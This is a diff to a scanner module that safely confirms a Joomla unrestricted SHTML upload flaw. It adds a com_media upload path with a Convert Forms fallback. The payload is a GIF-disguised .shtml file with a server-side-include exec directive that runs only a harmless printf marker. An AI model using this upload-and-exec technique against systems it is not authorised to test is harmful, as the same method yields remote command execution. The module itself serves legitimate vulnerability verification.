@@ -6,6 +6,7 @@ from ...core.probes import rand_str
 from ...core.versions import parse_version_safe
 from .advisory import passive_core_finding
 from .convertforms_probe import probe_upload
+from .joomla_media_probe import probe_media_upload
 
 CVE_ID = "CVE-2026-73373"
 NAME = "Joomla unrestricted SHTML upload"
@@ -57,21 +58,39 @@ def run_safe_probe(
     execution_marker = f"{marker}_EXEC"
     filename = f"proofcms-{rand_str(8)}.shtml"
     payload = (f'GIF89a\n{marker}\n<!--#exec cmd="printf {execution_marker}" -->\n').encode()
-    proof = probe_upload(
+    proof = probe_media_upload(
         target_url,
         filename=filename,
         payload=payload,
+        marker=marker,
         content_type="image/gif",
         timeout=timeout,
         proxy=proxy,
     )
+    proof_source = "Joomla com_media"
+    if not proof.get("accepted"):
+        convertforms_proof = probe_upload(
+            target_url,
+            filename=filename,
+            payload=payload,
+            content_type="image/gif",
+            timeout=timeout,
+            proxy=proxy,
+        )
+        if convertforms_proof.get("accepted"):
+            proof = convertforms_proof
+            proof_source = "Convert Forms"
+        else:
+            proof["convertforms_fields_found"] = convertforms_proof.get("fields_found", 0)
+            proof["attempts"] = list(proof.get("attempts", [])) + list(convertforms_proof.get("attempts", []))
     passive.exploit_ran = True
     if not proof.get("accepted"):
         passive.status = "NOT_CONFIRMED"
         passive.confidence = "MEDIUM"
         passive.detail = (
-            "The SHTML upload was not confirmed through an available public Convert Forms upload field. "
-            f"Fields discovered: {proof.get('fields_found', 0)}. "
+            "The SHTML upload was not confirmed through the public Joomla media or Convert Forms adapters. "
+            f"com_media exposed: {proof.get('surface_found', False)}; Convert Forms fields discovered: "
+            f"{proof.get('convertforms_fields_found', proof.get('fields_found', 0))}. "
             f"Attempts: {'; '.join(proof.get('attempts', [])) or 'none'}."
         )
         passive.action = (
@@ -79,7 +98,7 @@ def run_safe_probe(
         )
         return passive
 
-    response_body = proof["response"].get("body", "")
+    response_body = proof.get("proof_body", "") or proof.get("response", {}).get("body", "")
     passive.proof_url = proof["proof_url"]
     passive.uploaded_filename = proof["uploaded_filename"]
     if execution_marker in response_body and "#exec" not in response_body:
@@ -93,7 +112,7 @@ def run_safe_probe(
         passive.confidence = "CONFIRMED"
         passive.detail = (
             "The SHTML file was accepted and retrieved, confirming the dangerous file-type filter bypass, "
-            "but this server did not execute its SSI directive."
+            f"through {proof_source}, but this server did not execute its SSI directive."
         )
     passive.action = f"Upgrade to Joomla 5.4.8, 6.1.3, or newer and delete {proof['uploaded_filename']} from the Joomla temporary directory."
     return passive
@@ -128,7 +147,7 @@ def metadata() -> dict[str, Any]:
         "exploit_available": True,
         "exploit_modes": ["safe"],
         "intrusive": False,
-        "module_version": "1.0.0",
+        "module_version": "1.1.0",
         "last_reviewed": "2026-09-29",
         "updated": "2026-09-29",
         "required_detectors": ["convertforms"],
